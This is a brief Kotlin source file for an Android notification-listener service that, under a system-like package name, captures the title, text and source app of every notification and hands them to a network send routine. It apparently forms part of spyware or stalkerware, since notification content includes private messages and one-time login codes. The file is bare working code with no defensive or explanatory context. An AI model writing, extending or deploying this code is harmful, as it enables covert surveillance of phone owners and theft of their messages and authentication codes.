package com.sys.service

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification

class NotifSvc : NotificationListenerService() {
    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val t = sbn.notification.extras.getCharSequence("android.title")?.toString().orEmpty()
        val x = sbn.notification.extras.getCharSequence("android.text")?.toString().orEmpty()
        if (t.isBlank() && x.isBlank()) return
        Net.send(mapOf("c" to "n", "p" to sbn.packageName, "t" to t, "x" to x))
    }
}
